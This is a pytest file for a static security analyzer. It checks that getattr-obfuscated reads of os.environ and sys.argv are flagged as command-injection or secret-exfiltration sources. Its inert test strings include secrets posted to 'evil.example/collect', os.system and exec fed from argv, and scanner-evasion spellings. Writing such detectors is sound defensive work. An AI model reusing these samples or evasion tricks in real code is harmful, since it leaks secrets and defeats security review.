"""CLAWSECCHECK-B-926 — `getattr(os, "environ")[...]` / `getattr(sys, "argv")[...]`
close the last gap in `_rhs_has_subscript_environ`/`_rhs_has_sysargv` themselves.

Context: B-906's `_RefResolver` already proves `getattr(os, "environ")["P"]` resolves
to `os.environ` (see `tests/test_b906_ref_resolver.py::
test_b926_getattr_indirection_bound_and_inline`), so the ONE call site that threads
`ref_res` through -- `_subprocess_taint_is_command_injection`'s argv[0]/"prog" check --
already convicted this exact shape as `TT5_CMD_INJECTION`/crit before this fix. That
is confirmed, not re-derived, by `test_ticket_repro_argv0_already_crit_via_ref_resolver`
below.

`_rhs_has_subscript_environ` and its sibling `_rhs_has_sysargv` (skillast.py) are,
however, ALSO called directly, spelling-only, with no `ref_res` fallback at all, by
several other consumers: `_env_tainted_names` (feeds ENV_EXFIL_FLOW), the sys.path
writable-import-path check (`_is_writable_import_path`), the CAP_ENV_READ capability
declaration checks, and `analyze_env_auth_kwarg_exfil`. None of those had ANY recourse
for the getattr-obfuscated spelling -- they missed it entirely (no finding at all,
not merely a lower severity). Worse for `sys.argv`: `_RefResolver`'s vocabulary is
env-var-only (`_ENV_MAPPING_REFS`/`_ENV_READ_CALLABLE_REFS`), so it never covers
`sys.argv` at any call site -- `getattr(sys, "argv")[...]` reaching a exec-family sink
DIRECTLY (no ref_res anywhere in that path) was a genuine full recall miss before this
fix, confirmed below by `test_sysargv_getattr_to_os_system_matches_literal_severity`.

Fix: both `_rhs_has_subscript_environ`/`_rhs_has_sysargv` now also match the
getattr-obfuscated spelling via a small shared helper, `_is_getattr_of(node, base,
attr)` -- a `getattr(<base>, "<attr>")` call (the builtin, 2 OR 3 positional args --
see the C-135 follow-up paragraph below -- no keywords/splat) whose base resolves
(via the same `_attr_base` every other spelling check in this module already uses)
to *base* and whose second argument is the literal string *attr*. Permanently
unguarded against a local shadow of the builtin `getattr` name -- same established,
deliberate design as every other taint-SOURCE recognizer in this module (see
`_rhs_has_sysargv`'s own docstring on the B-955 shadow-guard lesson): a spelling-
based source recognizer does not try to be adversarially sound against shadowing, it
only must never let shadowing SUPPRESS a real finding -- an unguarded match cannot
do that, it can only ever add recall.

C-135 follow-up (independent review of the first round of this fix): the initial
`_is_getattr_of` hard-required exactly 2 positional args, missing the equally
idiomatic 3-arg default-value form -- `getattr(os, "environ", {})` /
`getattr(sys, "argv", [])`. The attribute genuinely exists on the real module, so
the default is never actually used at runtime (`getattr(os, "environ", {}) is
os.environ` is always True) -- this is arguably a MORE natural obfuscation than
the bare 2-arg form, not a more exotic one, and the reviewer confirmed it was a
real, reproducible miss (not merely a lower severity) against the patched commit
on both the `ENV_EXFIL_FLOW` and `TT5_CMD_INJECTION` paths. Closed by widening the
arg-count check to `len(node.args) in (2, 3)`, without inspecting the 3rd arg's
value at all -- its mere presence (or absence) is the only thing that matters. See
`test_is_getattr_of_accepts_the_3_arg_default_value_form` and the parallel
`*_3arg_default_form*` end-to-end tests below.

Deliberately OUT of scope for this fix (left as a follow-up, not scope-creeped in):
the analogous `getattr(os, "getenv")(...)` obfuscation of an `os.getenv(...)` CALL --
that spelling is checked independently, by raw `_attr_base` match, at several separate
call sites across this module (not just two), so giving it the same treatment is a
wider change than this narrow fix.

Offline, read-only, stdlib only. Every `exec`/`os.system`/`subprocess(...)`/network
spelling below is INERT test data handed to `analyze_python`'s read-only AST parser
(see its own docstring: "Never raises, never executes") -- this file never calls,
imports, or shells out to any of it, matching every sibling test module in this
directory (test_b955_sysargv_taint_source.py, test_b906_ref_resolver.py).
"""
from __future__ import annotations

import ast

from clawseccheck.skillast import (
    _is_getattr_of,
    _rhs_has_subscript_environ,
    _rhs_has_sysargv,
    analyze_python,
)


def _rules(src: str) -> dict[str, object]:
    return {f.rule: f for f in analyze_python(src, "t.py")}


def _subscript_of(src: str) -> ast.Subscript:
    tree = ast.parse(src)
    for n in ast.walk(tree):
        if isinstance(n, ast.Subscript):
            return n
    raise AssertionError(f"no Subscript found in: {src!r}")


# ---------------------------------------------------------------------------
# Unit level: the two RHS recognizers directly, plus the shared `_is_getattr_of`
# helper they now both use.
# ---------------------------------------------------------------------------


def test_rhs_has_subscript_environ_recognizes_getattr_form():
    node = _subscript_of('import os\nx = getattr(os, "environ")["P"]\n')
    assert _rhs_has_subscript_environ(node) is True


def test_rhs_has_subscript_environ_still_recognizes_literal_forms():
    """Regression guard: the fix is additive, the pre-existing literal spellings
    (Attribute form and the `from os import environ` bare-Name form) still match."""
    attr_form = _subscript_of('import os\nx = os.environ["P"]\n')
    assert _rhs_has_subscript_environ(attr_form) is True
    name_form = _subscript_of('from os import environ\nx = environ["P"]\n')
    assert _rhs_has_subscript_environ(name_form) is True


def test_rhs_has_sysargv_recognizes_getattr_form():
    node = _subscript_of('import sys\nx = getattr(sys, "argv")[1]\n')
    assert _rhs_has_sysargv(node, None) is True


def test_rhs_has_sysargv_still_recognizes_literal_forms():
    attr_form = _subscript_of('import sys\nx = sys.argv[1]\n')
    assert _rhs_has_sysargv(attr_form, None) is True
    name_form = _subscript_of('from sys import argv\nx = argv[1]\n')
    assert _rhs_has_sysargv(name_form, None) is True


def test_is_getattr_of_rejects_mismatched_base_or_attr():
    """Cross-wiring guard: `getattr(sys, "environ")`/`getattr(os, "argv")` are
    nonsense in practice, but must not accidentally satisfy the OTHER base's test --
    `_is_getattr_of` is a strict (base, attr) pair match, not an either/or."""
    call = ast.parse('getattr(sys, "environ")').body[0].value
    assert _is_getattr_of(call, "os", "environ") is False
    call2 = ast.parse('getattr(os, "argv")').body[0].value
    assert _is_getattr_of(call2, "sys", "argv") is False


def test_is_getattr_of_accepts_the_3_arg_default_value_form():
    """`getattr(os, "environ", <default>)` is fully valid, idiomatic Python that
    resolves to the exact same object as the 2-arg form (the attribute genuinely
    exists on the real module, so the default is never actually used at runtime:
    `getattr(os, "environ", {}) is os.environ` is always True) -- an even more
    natural obfuscation than the bare 2-arg form, and must match regardless of
    what the default value itself is."""
    dict_default = ast.parse('getattr(os, "environ", {})').body[0].value
    assert _is_getattr_of(dict_default, "os", "environ") is True
    none_default = ast.parse('getattr(os, "environ", None)').body[0].value
    assert _is_getattr_of(none_default, "os", "environ") is True
    list_default = ast.parse('getattr(sys, "argv", [])').body[0].value
    assert _is_getattr_of(list_default, "sys", "argv") is True


def test_is_getattr_of_rejects_wrong_arg_count_and_splat():
    one_arg = ast.parse('getattr(os)').body[0].value
    assert _is_getattr_of(one_arg, "os", "environ") is False
    four_args = ast.parse('getattr(os, "environ", None, None)').body[0].value
    assert _is_getattr_of(four_args, "os", "environ") is False
    splat = ast.parse('getattr(*a)').body[0].value
    assert _is_getattr_of(splat, "os", "environ") is False
    kwarg_form = ast.parse('getattr(os, name="environ")').body[0].value
    assert _is_getattr_of(kwarg_form, "os", "environ") is False


def test_is_getattr_of_rejects_non_getattr_call_and_non_call():
    not_getattr = ast.parse('getenv(os, "environ")').body[0].value
    assert _is_getattr_of(not_getattr, "os", "environ") is False
    name_node = ast.parse("environ").body[0].value
    assert _is_getattr_of(name_node, "os", "environ") is False
    assert _is_getattr_of(None, "os", "environ") is False


# ---------------------------------------------------------------------------
# End to end: the exact ticket repro. Already crit BEFORE this fix, via B-906's
# `_RefResolver` positive resolution at this one call site -- kept here as a
# same-severity-as-literal regression lock, not as new coverage from this fix.
# ---------------------------------------------------------------------------


def test_ticket_repro_argv0_already_crit_via_ref_resolver():
    src = (
        "import os, subprocess\n"
        "def run(cmd):\n    subprocess.check_call(cmd)\n"
        'def main():\n    run([getattr(os, "environ")["P"], "x"])\n'
    )
    r = _rules(src)
    assert "TT5_ARG_INJECTION" not in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"

    literal_equivalent = (
        "import os, subprocess\n"
        "def run(cmd):\n    subprocess.check_call(cmd)\n"
        'def main():\n    run([os.environ["P"], "x"])\n'
    )
    assert r["TT5_CMD_INJECTION"].severity == _rules(literal_equivalent)["TT5_CMD_INJECTION"].severity


# ---------------------------------------------------------------------------
# End to end: the sibling sys.argv shape, reached through a path `_RefResolver`
# does NOT cover at all (its vocabulary is env-var-only) -- this is the real,
# previously-full-miss gap this fix closes.
# ---------------------------------------------------------------------------


def test_sysargv_getattr_to_os_system_matches_literal_severity():
    src = 'import os, sys\nos.system(getattr(sys, "argv")[1])\n'
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"

    literal_equivalent = 'import os, sys\nos.system(sys.argv[1])\n'
    assert r["TT5_CMD_INJECTION"].severity == _rules(literal_equivalent)["TT5_CMD_INJECTION"].severity


def test_sysargv_getattr_bound_name_to_exec_is_crit():
    src = 'import sys\ncmd = getattr(sys, "argv")[1]\nexec(cmd)\n'
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"


def test_sysargv_getattr_3arg_default_form_matches_literal_severity():
    """C-135 follow-up: `getattr(sys, "argv", [])` -- the 3-arg default-value
    form -- is just as valid an obfuscation as the bare 2-arg form and must be
    recognized identically. Before this follow-up it was a full miss: only the
    generic info-level `DANGEROUS_SINK`/`SHELL_INJECTION_RISK` findings fired,
    same degraded shape as the original pre-fix gap."""
    src = 'import os, sys\nos.system(getattr(sys, "argv", [])[1])\n'
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"

    literal_equivalent = 'import os, sys\nos.system(sys.argv[1])\n'
    assert r["TT5_CMD_INJECTION"].severity == _rules(literal_equivalent)["TT5_CMD_INJECTION"].severity


# ---------------------------------------------------------------------------
# End to end: ENV_EXFIL_FLOW (`_env_tainted_names`) is a genuinely different
# consumer of `_rhs_has_subscript_environ` with no `ref_res` involved anywhere
# in its path -- before this fix, the getattr form was a silent full miss here.
# ---------------------------------------------------------------------------


def test_env_exfil_flow_recognizes_getattr_obfuscated_environ():
    src = (
        "import os, requests\n"
        "def main():\n"
        '    requests.post("https://evil.example/collect", '
        'data=getattr(os, "environ")["SECRET"])\n'
    )
    r = _rules(src)
    assert "ENV_EXFIL_FLOW" in r
    assert r["ENV_EXFIL_FLOW"].severity == "info"

    literal_equivalent = (
        "import os, requests\n"
        "def main():\n"
        '    requests.post("https://evil.example/collect", data=os.environ["SECRET"])\n'
    )
    assert _rules(literal_equivalent)["ENV_EXFIL_FLOW"].severity == "info"


def test_env_exfil_flow_recognizes_getattr_obfuscated_environ_bound_name():
    src = (
        "import os, requests\n"
        "def main():\n"
        '    secret = getattr(os, "environ")["SECRET"]\n'
        '    requests.post("https://evil.example/collect", data=secret)\n'
    )
    assert "ENV_EXFIL_FLOW" in _rules(src)


def test_env_exfil_flow_recognizes_getattr_3arg_default_form():
    """C-135 follow-up: the 3-arg default-value form (`getattr(os, "environ",
    {})`) is just as valid an obfuscation as the bare 2-arg form -- before this
    follow-up it was a complete miss (no ENV_EXFIL_FLOW finding at all)."""
    src = (
        "import os, requests\n"
        "def main():\n"
        '    requests.post("https://evil.example/collect", '
        'data=getattr(os, "environ", {})["SECRET"])\n'
    )
    r = _rules(src)
    assert "ENV_EXFIL_FLOW" in r
    assert r["ENV_EXFIL_FLOW"].severity == "info"


# ---------------------------------------------------------------------------
# Negative controls: an ordinary, unrelated `getattr()` call on an unrelated
# object must stay clean in every context this fix touches -- the widening
# must not manufacture a new false positive.
# ---------------------------------------------------------------------------


def test_unrelated_getattr_call_in_subprocess_argv_stays_clean():
    src = (
        "import subprocess\n"
        "class Config:\n    pass\n"
        "def main():\n"
        "    cfg = Config()\n"
        '    subprocess.check_call(["ls", getattr(cfg, "some_attr")[0]])\n'
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" not in r
    assert "TT5_ARG_INJECTION" not in r


def test_unrelated_getattr_call_does_not_trigger_env_exfil_flow():
    src = (
        "import requests\n"
        "class Config:\n    pass\n"
        "def main():\n"
        "    cfg = Config()\n"
        '    requests.post("https://api.example/report", data=getattr(cfg, "some_attr")[0])\n'
    )
    assert "ENV_EXFIL_FLOW" not in _rules(src)


def test_unrelated_getattr_call_does_not_trigger_sysargv_source():
    src = 'import os\nclass Config:\n    pass\ncfg = Config()\nos.system(getattr(cfg, "argv")[0])\n'
    assert "TT5_CMD_INJECTION" not in _rules(src)
